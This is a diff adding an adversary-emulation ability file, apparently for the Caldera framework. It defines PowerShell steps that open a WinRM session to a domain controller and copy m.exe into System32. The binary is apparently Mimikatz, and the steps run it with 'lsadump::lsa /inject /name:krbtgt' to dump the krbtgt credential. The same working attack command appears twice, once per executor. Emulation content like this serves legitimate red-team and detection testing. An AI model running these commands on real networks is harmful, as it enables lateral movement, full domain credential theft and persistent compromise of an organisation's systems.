@@ -1,0 +1,61 @@
+ability_id: acecc8f7-18c2-41fd-87bc-39ffd644e4e9
+access: {}
+additional_info: {}
+buckets:
+- lateral-movement
+delete_payload: true
+description: Establish connection to Domain Controller
+executors:
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: ". .\\invoke-winrmsession.ps1;\n$session = invoke-winrmsession -Username\
+    \ \"#{target.winrm.username}\" -Password \"#{target.winrm.password}\" -IPAddress\
+    \ \"#{target.winrm.remote_host}\";\nCopy-Item m.exe -Destination \"C:\\Windows\\\
+    System32\\\\\" -ToSession $session -force;\nif ($?) {\n  write-host \"[+] Successfully\
+    \ copied m.exe to remote host\";\n} else {\n  write-host \"[!] Error, copying\
+    \ and executing m.exe on remote host\";\n}\nInvoke-Command -Session $session -scriptblock\
+    \ {C:\\Windows\\System32\\m.exe privilege::debug \"lsadump::lsa /inject /name:krbtgt\"\
+    \ exit} | out-string"
+  language: null
+  name: psh
+  parsers: []
+  payloads:
+  - invoke-winrmsession.ps1
+  - m.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+- additional_info: {}
+  build_target: null
+  cleanup: []
+  code: null
+  command: ". .\\invoke-winrmsession.ps1;\n$session = invoke-winrmsession -Username\
+    \ \"#{target.winrm.username}\" -Password \"#{target.winrm.password}\" -IPAddress\
+    \ \"#{target.winrm.remote_host}\";\nCopy-Item m.exe -Destination \"C:\\Windows\\\
+    System32\\\\\" -ToSession $session -force;\nif ($?) {\n  write-host \"[+] Successfully\
+    \ copied m.exe to remote host\";\n} else {\n  write-host \"[!] Error, copying\
+    \ and executing m.exe on remote host\";\n}\nInvoke-Command -Session $session -scriptblock\
+    \ {C:\\Windows\\System32\\m.exe privilege::debug \"lsadump::lsa /inject /name:krbtgt\"\
+    \ exit} | out-string"
+  language: null
+  name: pwsh
+  parsers: []
+  payloads:
+  - invoke-winrmsession.ps1
+  - m.exe
+  platform: windows
+  timeout: 60
+  uploads: []
+  variations: []
+name: Remote Connection (T1028) & Remote File Copy (T1105) & Credential Dumping
+plugin: emu
+privilege: ''
+repeatable: false
+requirements: []
+singleton: false
+tactic: lateral-movement
+technique_id: T1105
+technique_name: Ingress Tool Transfer
